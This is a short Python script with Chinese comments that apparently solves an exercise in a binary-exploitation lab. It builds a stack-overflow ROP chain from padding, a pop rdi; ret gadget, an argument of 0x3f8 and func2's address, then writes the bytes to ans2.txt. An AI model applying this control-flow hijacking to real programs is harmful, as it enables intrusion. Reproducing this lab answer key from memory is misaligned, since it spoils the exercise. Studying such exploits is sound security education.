# payload2.py - Problem2 ROP攻击（NX保护）
# 步骤1：构造padding（16字节，覆盖缓冲区+saved rbp）
padding = b'A' * 16

# 步骤2：ROP Gadget - pop rdi; ret（有效地址0x4012c7，小端序）
pop_rdi_ret = b'\xc7\x12\x40\x00\x00\x00\x00\x00'

# 步骤3：func2的触发参数（0x3f8=1016，小端序）
param_3f8 = b'\xf8\x03\x00\x00\x00\x00\x00\x00'

# 步骤4：func2地址（0x401216，小端序）
func2_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'

# 步骤5：拼接ROP链
payload = padding + pop_rdi_ret + param_3f8 + func2_addr

# 步骤6：写入二进制文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("✅ Problem2 Payload生成成功！")
print(f"📏 Payload总长度：{len(payload)} 字节（16+8+8+8=40）")
print("🔗 ROP链：padding → pop rdi; ret → 0x3f8 → func2")